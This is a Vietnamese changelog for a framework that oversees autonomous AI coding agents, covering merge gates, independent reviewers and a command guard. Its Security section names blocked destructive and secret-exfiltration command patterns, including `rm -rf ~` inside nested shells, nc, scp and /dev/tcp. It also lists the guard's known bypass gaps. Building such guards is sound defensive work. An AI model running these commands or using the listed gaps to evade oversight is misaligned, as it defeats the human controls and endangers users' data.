- Review độc lập PR #173. 🔴 `check-links.py --external` chỉ đọc đích của link Markdown (ngoặc vuông + ngoặc tròn) nên chỉ kiểm 9 URL — khung ghi nguồn
  bằng autolink `<https://…>` (≈ 800 URL, lychee trước đây có quét) → `links.yml` xanh giả. Giờ đọc cả autolink và URL
  trần (bỏ dấu câu/`)` đóng câu), bỏ qua URL trong code span và code fence (ví dụ `https://evil/…`); dedup, phân loại,
  retry giữ nguyên; repo hiện 812 URL. Job `links.yml` nâng `timeout-minutes` 20 → 30 (812 URL / 8 luồng thường vài
  phút; chừa chỗ cho nhóm host timeout × 3 lần thử). 🟠 `compose --out` có file cũ mà `features:` cũ có fact lần ghép
  này bỏ → stderr `⚠ bỏ feature <fact>: N mục về SHOULD (<ID>…)`; exit code và nội dung ghi không đổi (khoá `features`
  vào `scope` của `loop init` để sau — ADR-0030). 🟢 `autonomy-bench` exit 1 cả khi có ca lệch (kể cả `code` khác
  mong đợi) hoặc ID bắt buộc chưa có ca; `doctor --drift --latest <sai dạng>` → exit 2 kèm lỗi thay vì lặng lẽ bỏ qua;
  `compose --feature` ở M không đổi mục nào thì nói lý do thật (không module nào khai fact) thay vì "chỉ M". 🟡 PLAN
  T-1510 ghi đúng: 3.9.0 không tag riêng vì VERSION lên 3.10.0 trong cùng PR (D-093). Dự án đích: chạy lại `install.py`.

## [3.9.0] - 2026-10-19

### Added
- Hai tầng executor, chuyển cấp, audit theo mốc, review chưa kết luận, cổng G7 máy đọc ([ADR-0029](docs/adr/0029-two-executor-tiers-milestone-audit-release-check.md),
  D-075…D-078; nghiên cứu [`research/2026-10-19-rapid-build-then-harden.md`](research/2026-10-19-rapid-build-then-harden.md)):
  - `.claude/agents/executor-deep.md` (tầng sâu) và `reviewer-alt.md` (reviewer khác họ với `reviewer`, cho diff của
    `executor-deep`/phiên chính cùng họ); `reviewer.md` biết kết luận INCONCLUSIVE.
  - `PLAN.md`: `(exec: deep)` trong dòng task → tầng sâu; mục `##`/`###` chứa task là mốc. `loop status --json` (verdict
    `continue`) thêm `executor`/`tier`/`escalated`/`default_failures` — tầng mặc định đỏ 2 lần cùng task trong vòng này →
    chuyển cấp `executor-deep` (một dạng "đổi cách" của `LOOP-ORCH-014`, `max_same_failure` giữ 3) — và `milestone_done`
    khi mọi task của mục trước đã đóng (audit delta trước mốc kế). `loop record --executor executor|executor-deep` ghi agent
    vào evidence/`runs.jsonl`; `loop stats` thêm `executors` mỗi task, `escalated`, `escalation_rate`.
  - `pr reviewed --inconclusive`: reviewer không kết luận được (diff bị cắt, hết ngân sách, thiếu file) — sổ và dấu đăng
    `verdict=inconclusive`; `review_gate` coi là `missing` (cần review khác ở head), không `blocking`; vẫn `strict`.
  - `xt.py release-check [--blueprint B] [--status S] [--json]`: cổng G7 máy đọc gom blueprint `--strict --run`, `audit check
    --strict`, kiểm lại cuối khớp cây, cây git sạch + HEAD, số đề xuất "Khi chạy thật" chờ người → PASS/FAIL/N-A có bằng chứng,
    `verdict` GO / GO (chờ người) / NO-GO; exit 1 khi NO-GO. Mẫu `GO-NO-GO.md` trỏ tới nó.
  - Mục mới `LOOP-ORCH-019` (hai tầng executor, tên tầng không tên model, điều phối chạy model cao nhất sẵn có — không khả dụng
    thì Opus); sửa `LOOP-ORCH-002` (gói handoff thêm `executor_tier`, `escalation_condition`), `LOOP-ORCH-005` (khác họ với
    agent đã viết; INCONCLUSIVE), `LOOP-ORCH-014` (chuyển cấp). `lifecycle.md` quy tắc 6 "chất lượng theo pha — nhanh ở G6,
    tin cậy ở G7"; `audit.md` §1 hàng "Sau mỗi mốc"; giao thức autopilot bước 11b/14b; mẫu `PLAN.md`/`AGENTS.md`/`CLAUDE.md`.
    **Dự án đích:** chạy lại `install.py` (agent mới, `xt.py`); `AGENTS.md`/`CLAUDE.md` copy-if-absent — tự chép dòng §8 và
    "Model/effort".
- `merge-check`/`pr next`/steward: xung đột với nhánh đích kiểm **cục bộ** bằng `git merge-tree --write-tree` khi GitHub
  chưa tính xong `mergeable` (null tới vài chục giây sau push) hoặc báo xung đột — `localConflicts` liệt kê file xung đột,
  verdict `fix` kèm lệnh `git fetch origin <base> && git merge origin/<base>`; cục bộ thấy merge sạch thì không còn `wait`
  chờ GitHub. Commit chưa có cục bộ → fetch `refs/pull/N/head` (không fetch ở repo nông; `merge-gate` ở CI không kiểm
  cục bộ); tên file không phải UTF-8 không làm sập; không kiểm được (git < 2.38, repo nông, không phải repo) → như cũ.

- Reviewer độc lập trên GitHub (AUTO-03, T-1508): workflow `pr-review.yml` (`claude-code-action` ghim SHA, công cụ chỉ-đọc,
  `--json-schema`, trần turn/tiền, không checkout code PR) gọi `pr reviewed` bằng token của tài khoản reviewer; xt.yaml khai
  `review_identity` (chỉ dấu của tài khoản đó được tin), `author_model_family`/`reviewer_model_family` (`ci-check` từ chối
  trùng họ; `pr reviewed --clean` lấy họ từ cấu hình khi không truyền cờ). Mặc định TẮT tới khi chủ repo cấp
  `XT_REVIEWER_TOKEN`, `ANTHROPIC_API_KEY` (environment `pr-review`) và đặt biến `XT_REVIEWER_ENABLED=true`.

- Guard có quyết định kiểu (REC-04, T-1509, D-081/D-082): `Decision(action, code, confidence, missing)` và bảng `apply_policy`
  tra theo mã lý do; mã UNPARSED/BUDGET hoặc `confidence: unsure` trong nhóm chặn → deny ở bash/mcp/edit (`XT_GUARD_POLICY=strict`
  giữ hành vi hỏi cũ). Hook mới `.claude/hooks/permission-request.sh` (sự kiện `PermissionRequest`, cho headless): guard không
  phản đối thì im lặng, không tự allow. Corpus chặn oan không tăng (`test_guard_corpus_typed_decision_codes`).
  **Dự án đích:** chạy lại `install.py` (hook + `settings.json`).

### Changed
- `merge_risk_paths` của repo khung bỏ tài liệu thuần (`docs/adr/*`, `framework/11-autonomous-loop/*`, `code-review.md`) — PR chỉ sửa
  tài liệu đi làn nhanh, lớp đỡ `validate` + `check-links` + revert; giữ `scripts/*`, `framework/templates/*` (D-080, chủ repo).
- Cổng `test` của repo khung chạy **mỗi lớp test một tiến trình, song song theo số CPU** (D-079): danh sách lớp từ
  `unittest` discover (không lớp rỗng → không "Ran 0 tests"), `coverage parallel=True` combine rồi vẫn đòi 100 % dòng + nhánh —
  cùng tập test, cùng ngưỡng; `scripts/dev-task.sh gate` 195 s → 68 s trên 4 CPU (test 180 s → 66 s), CI `quality` nhanh theo.
  Không đổi mẫu `xt.yaml` của dự án đích.
- Một điều kiện "được merge" ([ADR-0028](docs/adr/0028-single-merge-eligibility.md), REC-03, T-1507): hàm thuần `review_gate`/
  `merge_eligibility` dùng chung cho `merge-check` (`--json` thêm `review`, `eligible`, `auto_merge_ok`), `pr next`, `merge-gate`,
  guard `gh`/MCP và steward. `merge-gate` nay đỏ cả khi PR làn chuẩn đang bật auto-merge mà chưa có review sạch ở đúng head
  (trước đây chỉ `hard`); guard hỏi khi bật auto-merge/merge PR làn chuẩn thiếu review đã đăng ở head (đính chính AUD-DOC-054: chỉ khi `XT_GUARD_POLICY=strict`, chính sách mặc định cho qua — xem Unreleased). **Dự án đích:** chạy lại
  `install.py` (guard + `xt.py` đổi).

### Fixed
- README mục "Dùng thế nào" bước 4 vẫn liệt kê deploy/publish và đổi cấu hình cổng là điểm dừng bắt buộc, trái với
  AGENTS.md §5/ADR-0018/D-023 (cho chạy, lớp đỡ là CI/ruleset/review) — đồng bộ lại; phát hiện khi đối chiếu bản "Kế hoạch
  nâng cấp X-Templates" trong [`research/2026-10-19-rapid-build-then-harden.md`](research/2026-10-19-rapid-build-then-harden.md)
  (đề xuất "code nhanh → kiểm liên tục → audit sâu → fix → tối ưu → nghiệm thu → production" và PD-01…PD-12 đối chiếu với
  G0–G8/autopilot/audit/GO-NO-GO: khung đã có phần lớn; còn thiếu nhịp audit theo mốc, verdict `inconclusive` cho reviewer,
  GO/NO-GO máy đọc — chưa làm, ghi §7/§8/§9 của bản nghiên cứu; §9 đối chiếu đề xuất hai tầng executor Sonnet/Opus — chưa có, kèm ràng buộc reviewer khác họ).
- Review #168: ghi chú dự án (`— Bằng chứng:`, `(Miễn: …)`) của mục không có đuôi `→ Kiểm:`/`· Nguồn:` không còn bị tính là chữ
  yêu cầu (trước đó mục `[x]` về `[ ]` oan); với `review_identity`, `pr next`/steward bỏ sổ review cục bộ của tác giả, dấu bị
  sửa sau khi đăng không tính, `review_identity` lấy từ cây làm việc khi không đọc được `origin/<base>`; `pr-review.yml` cấm
  tường minh Bash/ghi file/web, truyền model reviewer thật cho `pr reviewed`, ghi diff ra file trước khi cắt.
- `audit plan`/`audit check --strict`: nhóm sổ ghi **N/A** được đối chiếu lại với tín hiệu repo hiện tại — repo từng không có UI/CSDL
  rồi có (nhóm A11Y/DATA) trước đây không bao giờ được quét lại; nay `audit_rescan` báo "N/A→áp dụng: …" và `--strict` đỏ tới
  khi quét nhóm đó hoặc ghi `Giải trình: <lý do>` ở Ghi chú (REC-07, T-1506).
- `compose` ghép lại blueprint: mục `[x]`/`[~]` mà **chữ yêu cầu** (phần quy phạm, trước `→ Kiểm:`/`· Nguồn:`) đổi so với
  bản cũ nay về `[ ]` kèm `— Cũ (rev <8 hex>, trước đó [x|~])` thay vì mang `[x]` và bằng chứng cũ sang yêu cầu mới;
  `carry_states` trả danh sách `stale`, `compose` báo, `blueprint-status` (cả `--json` `stale`) liệt kê mục còn `[ ]` mang
  `— Cũ`. Đổi mức/ngưỡng quy mô, Kiểm hoặc Nguồn không phải đổi yêu cầu (ADR-0012: chuyển file theo quy mô vẫn giữ trạng thái)
  (REC-06, T-1505).
- `merge-check`/`pr next`/steward: check bắt buộc của ruleset bị SKIPPED/NEUTRAL/CANCELLED/STALE hoặc chỉ có bản của app khác
  (`integration_id` ≠ app sinh check) nay là `human` ("không chạy thật") — GitHub tính required check skipped/neutral là đạt
  nên PR từng "xanh" khi chưa test nào chạy; `_pr_rest` đưa `appId` của check-run và `requiredChecks` của ruleset vào PR,
  `_ci_buckets` trả thêm nhóm `not_run` (REC-08, T-1504).
- `loop init` ghi `scope` (blueprint, profile, scale, `rev`, khoá sàn Gate) vào state: blueprint đã khai mà mất, hỏng hoặc đổi quy mô/hồ sơ
  nay là verdict `verify` (trước đây xoá blueprint khiến vòng khai `done`); sàn Gate M/L đọc quy mô từ `scope` khi blueprint mất
  nên xoá/hạ quy mô không bỏ được sàn; state cũ không có `scope` được điền khi `loop resume` (REC-02, T-1503).
- `loop record`/`loop verify`/lệnh `— Kiểm:`/sàn Gate: Gate exit 0 mà đầu ra có `Ran 0 tests` (unittest Python 3.11 khi `-k`
  không khớp test nào; 3.12+ tự exit 5) nay là exit 5 kèm dòng lý do, evidence ghi `zero_tests_red: true` — Gate `-k <tên>`
  không còn xanh giả (REC-01, T-1501).
- `same_command` giữ ngữ nghĩa nháy của bash: `echo '$X'` (chữ) ≠ `echo "$X"` (bung) ≠ glob/`~` ngoài nháy — trước đây
  `shlex.split` coi là cùng lệnh nên `loop_verdict` và `run_blueprint_checks` gộp lệnh khác nghĩa; evidence ghi
  `cmd_sha256` của lệnh nguyên văn và `loop_verdict` khớp dấu vân tay trước; toán tử điều khiển ngoài nháy (`&&`, `;`, `|`,
  `>`, `#` đầu từ, xuống dòng) tách token riêng, ký tự toán tử liền nhau và số fd dính `<`/`>` gộp một token nên
  `echo ok && false` ≠ `echo ok '&&' false`, `x &> log` ≠ `x & > log`, `echo 2>f` ≠ `echo 2 >f` (REC-01, T-1502).
- `perf guard`: tên file không phải UTF-8 (đã thay byte lạ bằng U+FFFD, không mở lại được) được báo đáng ngờ thay vì qua
  lặng lẽ (review #165).
- `vendor-check`: đuôi file ghi nguồn theo danh sách cho phép (md/txt/rst/adoc/html, đoạn viết hoa/số) — `data_source.c`,
  `license_header.h`, `notice.less`, `license.svg` không còn được tính là ghi nguồn; `LICENSES.chromium.html` được nhận
  (review #162/#164, AUD-XFEAT-007).
- `perf guard`: thư mục cha chỉ "đã ignore sẵn" khi luật nằm trong `.gitignore` đã theo dõi — `bench/sub/.gitignore` = `*`
  trong thư mục mới và `info/exclude` không giấu được file đổi phép đo (review #162/#164, AUD-XFEAT-005).
- `pr reviewed`: họ model ngắn (`phi`, `glm`, `nova`, `command`, `kimi`, `oN`) ranh giới theo chữ cái — `graphic`/
  `commander` không lộ họ, `phi4`/`glm4.5`/`command_r` được nhận; `contrast --json` `skipped` đếm cả khi `--allow-skip`.

## [3.8.0] - 2026-10-19

> **Dự án đích khi nâng từ 3.7.x:** chạy lại `install.py` (guard, `_lib.sh`, `pre-mcp-guard.sh`, matcher hook MCP trong
> `settings.json`, `xt.py`, mẫu, `.claude/agents/*.md` đổi). Guard chặn thêm (lồng sâu, brace expansion, gửi bí mật qua
> scp/nc/gist, xoá ngoài dự án, dấu review tay); `contrast` đỏ với cặp màu không đọc được (`--allow-skip` nếu cố ý);
> `merge-check` không coi `merge-gate` là bằng chứng CI; khung ở dự án con canh `xt.yaml` của dự án con.

### Added
- Kế hoạch khắc phục và nâng cấp tự động hóa sau đánh giá ngày 2026-10-19 (bản 2, thay nháp #160):
  [`docs/ops/REMEDIATION-PLAN-2026-10-19.md`](docs/ops/REMEDIATION-PLAN-2026-10-19.md) — tái hiện lại REC-01/03/06/08
  bằng lệnh trên `19d3aa8`, nghiên cứu bổ sung nguồn sống (required check `skipped`/`neutral`, hook `PermissionRequest`/
  `TaskCompleted`/`SubagentStop`, headless `--json-schema`, Code Review, Routines), thang tự chủ theo loại PR, cơ chế cụ
  thể cho AUTO-01…07; kèm kế hoạch máy đọc cho đợt 3.9.0 → 3.10.0
  [`docs/autopilot/PLAN-3.9-automation.md`](docs/autopilot/PLAN-3.9-automation.md) (T-1501…T-1522, chạy `loop init --plan`
  sau khi 3.8.0 phát hành — D-066…D-070). Đề xuất tài liệu, chưa thay đổi hành vi công cụ.

### Security
- Guard (audit 2026-10-19, chính sách mặc định ADR-0018):
  - shell lồng quá 4 lớp (`bash -c` ×5 quanh `rm -rf ~`) nay **chặn** thay vì cho qua im lặng; `find -exec` còn quét
    được hai lớp shell bên trong (AUD-SEC-063);
  - brace expansion: guard quét bản bung thật như bash (`git push origin {feat/x,main}` → `… feat/x main`),
    `rm -rf {dist,~/.cache}`, `gh repo {delete,} o/r` bị chặn; dò nhóm tuyến tính có trần (> 512 `{` ngoài nháy hoặc bản
    bung > 64 KB, từ có `{` dài > 4096 ký tự → chặn) (AUD-SEC-064);
  - `rm -rf build 2>/dev/null` không còn bị coi là xoá `/dev/null` (đích chuyển hướng không phải đối số);
  - hook chạy `python3 -I` (bỏ `PYTHONPATH`/`PYTHONPYCACHEPREFIX`/user-site `usercustomize.py`), bytecode cache chuyển từ
    `~/.cache/xtemplates/pycache` vào `.autopilot/pycache` của dự án (đã rào ghi tay) — mã agent đặt ngoài dự án không
    chạy thay guard (AUD-SEC-065);
  - `pre-mcp-guard.sh`: lối tắt "tắt auto-merge" chỉ khi payload có đúng một khoá `tool_name` (AUD-SEC-066);
  - gửi file bí mật ra mạng qua `scp`/`rsync`/`sftp` tới máy khác (`host:`, `scp://`), `aws s3`/`gsutil`/`rclone`,
    `nc`/`ncat`/`socat`/`telnet`/`ssh`, `gh gist create|edit`, `gh release upload`, `--body-file`, ghi vào `/dev/tcp/…`
    → chặn; giá trị tuỳ chọn (`scp -i key.pem`, `rsync -e "ssh -i k"`, `--exclude .env`) và khoá `.pub` không tính
    (AUD-SEC-067). Giới hạn: thư mục/glob chứa bí mật (`scp -r . h:`), `tar c . | ssh` không bị bắt;
  - xoá/huỷ ngoài dự án qua `rsync --delete` (đích local) / `--remove-source-files`, `shred`, `mv` gốc/home hoặc thư
    mục ngoài dự án đi nơi khác ngoài dự án, `rmtree`/`remove_tree` trong script (cả `Path.home()`) → chặn
    (AUD-SEC-068);
  - dấu review (đúng dạng `xt-review v1 head=<40 hex> verdict=…`) đăng tay qua `gh pr|issue comment|review|create|edit`,
    `gh api` ghi hoặc tool MCP comment/review/PR → chặn — chỉ `xt.py pr reviewed` đăng (ADR-0027, AUD-SEC-069); matcher
    hook MCP thêm tool comment/review. Giới hạn (gờ giảm tốc, không phải kiểm soát): dấu ghi vào file rồi
    `--body-file`, ghép lúc chạy (`$(…)`), `curl`/script gọi REST không bị bắt — lớp thật là steward chỉ tin tác giả có
    quyền ghi.

### Fixed
- `merge-check`: check `merge-gate`/`pr-steward` (chỉ xét auto-merge, không chạy test) một mình xanh không còn là bằng
  chứng CI → `human` thay vì `merge` — dự án đích cài `--with-github` chưa có CI riêng từng được merge khi chưa test nào
  chạy (AUD-HAR-058).
- Khung cài ở dự án con (`apps/web`): khoá `merge_hard_exceptions` đọc ở `apps/web/xt.yaml` nay là file được canh (PR
  đổi nó luôn người merge, ADR-0020) và glob `merge_risk_paths` viết theo gốc dự án khớp cả đường file tính từ gốc repo
  (`project_prefix`, AUD-XFEAT-003/004).
- `pr next`: review ở đúng head hiện tại quyết; review sạch đến muộn ở head cũ (mang qua merge nhánh đích) không còn che
  review báo lỗi chặn ở head hiện tại (AUD-HAR-059).
- `perf guard`: `.gitignore` mới tự che chính nó (`*`) trong vùng khoá không còn giấu file chưa theo dõi đổi phép đo
  (AUD-XFEAT-005).
- `contrast`: cặp không đọc được màu (`color-mix`/`lab`/`color()`/nền trong suốt) nay làm đỏ (UX-DS-003 "mọi cặp") —
  `--allow-skip` để bỏ qua có chủ đích (ghi lý do ở PR); alpha `none` không còn làm sập lệnh (AUD-XFEAT-006/008).
- `vendor-check`: file ghi nguồn khớp NGUYÊN tên (`LICENSE`, `LICENSE-MIT`, `NOTICE.txt`, `SOURCE.md`,
  `THIRD-PARTY-NOTICES`…) — file mã `SourceSelect.tsx`/`Notice.tsx` không còn được tính là ghi nguồn; file ẩn
  (`.gitkeep`) không bị báo thiếu license (AUD-XFEAT-007/009).
- `pr reviewed --clean`: tên model không lộ họ (`claude`, `reviewer`, `Claude Code`) bị từ chối — so "khác họ" với tên
  mơ hồ luôn đúng (D-045, AUD-HAR-064).

### Changed
- `LOOP-STOP-002` (MUST, chữ): ở L3 auto-merge bật theo làn — làn chuẩn chỉ sau review sạch ở đúng head (`xt.py pr
  next`), khớp `LOOP-STOP-009` và ADR-0024 (trước ghi "cho mọi PR", AUD-DOC-045). `PRF-MONO-006`, `FE-BUILD-010`,
  `QA-STATIC-014` và bảng Ruleset/CI ghi đủ 5 required check gồm `merge-gate` (ADR-0023, AUD-DOC-044).
- `xt.py --help` ghi đủ mã thoát (3 lỗi GitHub/hết giờ, 126 guard cấm — `PRF-CLI-001`, AUD-HAR-062); bảng lệnh mảng 11
  thêm `pr next/reviewed/steward`, `guard-check`, `contrast`, `vendor-check`.
- Mẫu dự án đích: `PLAN.md` T-001 Gate `.xtemplates/scripts/dev-task.sh gate` (đường dẫn ở dự án đích) và điền lệnh thật
  ở `xt.yaml`; chú thích `AGENTS.md`/`xt.yaml` trỏ `.xtemplates/` (AUD-HAR-068).
- README: biến môi trường đủ (`XT_GUARD_POLICY`, `XT_FRAMEWORK_REPO`, `XT_STEWARD_UPDATE`), ADR-0025…0027, số liệu
  mảng/MUST; dòng trạng thái ADR-0009/0012/0018/0021 theo ADR thay thế (AUD-DOC-047…050, AUD-HAR-060).
- `BLUEPRINT.md` của repo khung: 13 bằng chứng/miễn trừ lỗi thời viết lại; `BASE-GATE-009` bỏ tick, chờ chủ repo quyết
  (AUD-HAR-061, AUD-HAR-069).
- Subagent: nâng `maxTurns` gấp đôi theo yêu cầu chủ repo — `reviewer`/`researcher` 40 → 80, `executor` 60 → 120
  (audit 2026-10-19: 4/5 subagent `reviewer` dừng ở trần 40 lượt trước khi kịp trả báo cáo). Dự án đích: chạy lại
  `install.py` để nhận `.claude/agents/*.md` mới.

## [3.7.1] - 2026-10-19

> **Dự án đích khi nâng từ 3.7.0:** chạy lại `install.py` (chỉ `xt.py` đổi; không đổi workflow/hook). Sau khi nâng, PR đủ
> điều kiện được `pr next`/`pr-steward` merge ghim head ngay; repo chưa có check bắt buộc trên nhánh chính thì không còn
> bật auto-merge (import ruleset có required check để dùng auto-merge của GitHub).

### Fixed
- `pr next`/`pr steward`: PR đủ điều kiện (`merge-check` = `merge`: mọi check xanh, GitHub báo sạch) mà auto-merge đã bật
  nhưng GitHub chưa merge nay được merge ghim head ngay thay vì "chờ required check" mãi (X-Templates#155 phải merge tay).
  Nhánh đích không có check bắt buộc: `pr next` không còn bảo phiên agent bật auto-merge — chờ CI xanh rồi merge ghim
  head; chốt chuyển từ steward vào `pr next` nên che cả phiên agent; kết quả đọc rule nhớ 5 phút (D-063).

### Changed
- `pr steward --apply`: nhánh đích không có check bắt buộc (ruleset `rules/branches` hoặc branch protection cổ điển) thì
  không bật auto-merge — GitHub sẽ merge ngay lúc bật, trước khi CI chạy xong (sự cố hotel-manager#84/#85, chốt T-1107
  của dự án đưa vào khung); tắt auto-merge và merge ghim head khi `merge-check` đã thấy CI xanh vẫn chạy; báo cảnh báo
  ra summary (⚠, run không đỏ). Không đọc được rule hoặc protection `enforcement_level: off` → coi như không có (`LOOP-STOP-029`, D-062).

## [3.7.0] - 2026-10-19

> **Dự án đích khi nâng từ 3.6.0:** chạy lại `install.py --with-github` (hook `session-start.sh` mới, `xt.py` mới); chép
> `.github/workflows/pr-steward.yml.xtemplates-new` đè bản cũ (biến `XT_STEWARD_UPDATE`) — chưa chép thì steward trong
> Actions chỉ báo PR tụt nhánh, không tự cập nhật; muốn tự cập nhật nhánh thì đặt secret `XT_STEWARD_TOKEN`. Thêm dòng
> "Tên phiên" vào §9 `AGENTS.md` của dự án (file copy-if-absent — mẫu mới chỉ áp cho dự án mới).

### Added
- `LOOP-HARNESS-028` (SHOULD): tên phiên agent `<Tên repo> — <tên nhánh>` (nhánh agent tự đặt `<type>/<mô-tả-ngắn>`);
  hook SessionStart in gợi ý tên đúng theo remote `origin` + nhánh hiện tại (đang ở `main` thì nhắc tạo nhánh trước);
  AGENTS.md của khung và mẫu `AGENTS.md` §9 có dòng "Tên phiên".

### Changed
- `pr steward --apply`: PR tụt sau base (ruleset đòi nhánh cập nhật) được cập nhật nhánh bằng REST
  `pulls/<N>/update-branch -f expected_head_sha=<head>` (đang bật auto-merge thì tắt trước rồi cập nhật trong cùng lượt);
  `pr next`/`merge-check` gợi ý cùng lệnh. Review sạch mang sang head mới khi head là merge commit có cha đầu là head đã
  review, tập thay đổi của PR so với base (tên file, tên cũ, trạng thái, blob sha) không đổi và nhánh đích không chạm file
  nào của PR — tối đa 5 merge liên tiếp; khác đi thì review lại. Workflow `pr-steward` chỉ tự cập nhật nhánh khi có
  `XT_STEWARD_TOKEN` (commit do GITHUB_TOKEN tạo không kích CI; `XT_STEWARD_UPDATE=off` thì chỉ báo) (`LOOP-STOP-029`,
  D-061).
- `pr steward` chạy trong GitHub Actions mà không có `XT_STEWARD_UPDATE` (workflow cũ của dự án đích) thì không cập nhật
  nhánh — tránh head mới không có CI (D-061).

### Fixed
- `merge-check`/`pr next`/`pr steward`: PR bị GitHub báo BLOCKED vì ruleset đòi check bắt buộc không có trên head (không
  workflow nào sinh, vd `dast`) nay báo đúng "thiếu check bắt buộc: <tên> — thêm job đúng tên hoặc bỏ khỏi ruleset" thay vì
  "ruleset đòi review của người"; đọc REST `rules/branches/<nhánh>` chỉ khi BLOCKED, không đọc được thì giữ hành vi cũ
  (`LOOP-STOP-022`, D-060).

## [3.6.0] - 2026-10-19

> **Dự án đích khi nâng từ 3.5.1:** chạy lại `install.py` để có `xt.py vendor-check` mới; dự án có skill chép vào
> `.claude/skills/` thêm `xt.py vendor-check --dirs .claude/skills [--own …] --strict` vào CI (`UX-DS-022`).
> CI đang chạy `vendor-check --strict` có thể đỏ vì cảnh báo mới: file `SOURCE`/`ORIGIN` tự viết thiếu dòng `License:`
> (cho phép `**License:**`) hoặc URL repo gốc — thêm hai thông tin đó vào file ghi nguồn.

### Added
- Bàn giao UI/UX từ `stored` 06 §7i (`anti-slop`), đối chiếu ba cột ở `research/2026-10-19-stored-ui-7i.md`:
  - bảng chọn skill (`design-system-and-tokens.md`) thêm `antislop-copywriting`/`antislop-code`; `UX-DS-022` đòi `SOURCE.md`
    có `License:`, đặt sẵn câu hỏi chặn phiên của skill trước khi chạy tự động, ngưỡng tương phản trong skill khớp WCAG;
    hai bẫy mới (nạp cả bộ luật ~58 KB; đọc huy hiệu "Skills 32K" là số người dùng);
  - mẫu `AGENTS.md` §9 có dòng "UI" (DESIGN.md định hướng, giá trị từ token, token chữ `on-*`, `xt.py contrast` xanh mới
    báo xong).
- `xt.py vendor-check --own a,b`; `--dirs .claude/skills` bỏ qua skill do khung cài (manifest `install.py`) — D-059.

### Changed
- `UX-A11Y-002`: định nghĩa chữ lớn (≥ 24 px, hoặc ≥ 18,66 px và đậm) + bẫy "coi 18 px là chữ lớn".
- `xt.py vendor-check`: nhận mã SPDX `CC-BY-NC-*`/`CC-BY-SA-NC` và "Tailwind Plus/UI License" là điều khoản hạn chế; file
  `SOURCE`/`ORIGIN` tự viết thiếu dòng `License:` hoặc URL nguồn → cảnh báo (đỏ khi `--strict`) — `CMP-LIC-022`.

## [3.5.1] - 2026-10-19

> **Dự án đích khi nâng từ 3.5.0:** chạy lại `install.py --with-github` (`xt.py`, workflow `pr-steward.yml`). Repo thuộc
> org nay dùng được `pr-steward` (trước đây mọi PR bị `defer-human`).

### Fixed
- `pr steward`/`pr next` ở repo thuộc org (D-058): tác giả PR và người đăng dấu review là `MEMBER` được tin khi REST
  `collaborators/<login>/permission` trả `admin`/`write` (không hỏi được → không tin); workflow `pr-steward` chạy cả khi
  MEMBER comment dấu review. Trước đây mọi PR ở repo org bị `defer-human`.
- `pr_title_check: off` chỉ có hiệu lực khi cả xt.yaml ở nhánh đích lẫn cây làm việc đều `off` — PR không tự tắt luật
  tiêu đề cho chính nó (D-058).
- `pr steward --apply` không gắn được nhãn `xt-standard-lane` → dòng báo `⚠` (cả trong summary của run) và exit 1, thay vì
  im lặng; lượt đó không bật auto-merge/merge (lượt sau gắn lại nhãn rồi mới bật) — tắt auto-merge vẫn chạy. `MERGE_FIELDS` (`--pr-json` từ
  `gh pr view`) có thêm `author` để miễn tiêu đề cho PR của bot.
- Quyền ghi của MEMBER đọc cả `role_name` (`maintain` tính là ghi) và được nhớ 5 phút trong một tiến trình (`merge-watch`
  hỏi 30 giây/lần không tốn thêm request mỗi lượt); lỗi khi hỏi không được nhớ. ADR-0027 ghi chú sửa đổi ở dòng trạng thái.

## [3.5.0] - 2026-10-19

> **Dự án đích khi nâng từ 3.4.1:** chạy lại `install.py --with-github` (hook `guard.py`, `pre-mcp-guard.sh`, matcher của
> hook MCP trong `.claude/settings.json` — `install.py` nay cập nhật matcher của hook khung đã đăng ký, `xt.py`, workflow
> `pr-steward.yml` mới). PR có tiêu đề sai `<type>(scope): mô tả` hoặc > 72 ký tự nay bị `merge-check` trả `fix` (tắt
> bằng `pr_title_check: off`). PR đủ tiêu chuẩn tự vào nhánh chính qua `pr-steward` — repo cần bật "Allow auto-merge".

### Added
- **PR steward** (ADR-0027, D-054, `LOOP-STOP-029`): PR đủ tiêu chuẩn tự vào nhánh chính kể cả khi không còn phiên agent
  (phiên dừng, container khởi động lại, PR do phiên khác mở).
  - `xt.py pr reviewed` đăng kết quả review lên PR (comment có dấu `xt-review v1 head=… verdict=…`, không tên model);
    `--no-publish` chỉ ghi sổ cục bộ. `pr next` đọc thêm các dấu này — chỉ của OWNER/COLLABORATOR.
  - `xt.py pr steward [--pr N] [--repo o/r] [--apply] [--json]`: mọi PR mở → `pr next`; `--apply` tự bật/tắt auto-merge,
    merge ghim head; việc cần người/agent chỉ báo. Chỉ PR cùng repo của tác giả có quyền ghi (OWNER/COLLABORATOR,
    Dependabot) — PR từ fork/người ngoài để người merge; PR từng vào làn chuẩn gắn nhãn `xt-standard-lane` để giữ chặt.
  - Workflow `.github/workflows/pr-steward.yml` (mỗi 10 phút, khi có comment review, chạy tay); `install.py --with-github`
    copy vào dự án đích. Token `XT_STEWARD_TOKEN` (tuỳ chọn) để merge kích workflow `push`; repo cần bật "Allow auto-merge".
- Guard ghi công AI (`LOOP-HARNESS-027`, D-057) ngoài `git commit`: tiêu đề/thân PR và commit squash qua `gh pr
  create|edit|merge` (`--title/-t`, `--subject`, `--body/-b`, `--body-file/-F`, heredoc) và tool MCP ghi PR/commit
  (`create_pull_request`, `update_pull_request`, `create_or_update_file`, `push_files`, `delete_file`,
  `merge_pull_request`) bị chặn ở dự án `ai_attribution: forbid`. Hook MCP mở rộng matcher; tool không phải merge cho qua
  khi guard không chạy được (fail-open về luồng). Tên model ở **bất kỳ đâu** trong tiêu đề/thân bị chặn, kể cả khi nhắc
  như tên sản phẩm ("hỗ trợ Claude Sonnet") — diễn đạt khác (review #140). Còn lọt: URL phiên do máy chủ MCP tự gắn sau
  khi hook cho qua; `gh api …/pulls -f body=…` (chỉ theo luật `gh api`); thân lấy từ biến/ống/file do lệnh trước tạo.
- `xt.py merge-check` (D-056): đọc tiêu đề PR (REST và `gh pr view`); sai Conventional Commits hoặc > 72 ký tự → `fix`
  kèm lệnh `gh pr edit` — tiêu đề thành commit squash trên nhánh chính, bỏ qua cổng commit cục bộ. Miễn PR của bot
  (`…[bot]`) và `Revert "…"` của GitHub; dự án không theo Conventional Commits đặt `pr_title_check: off` trong `xt.yaml`.

### Changed
- `install.py`: hook của khung đã đăng ký mà matcher cũ → cập nhật matcher (chỉ mục gồm toàn lệnh của khung; mục dự án
  gộp thêm lệnh riêng giữ nguyên). Mục chỉ gồm lệnh khung mà dự án tự thu hẹp matcher sẽ về lại matcher mặc định.

## [3.4.1] - 2026-10-18

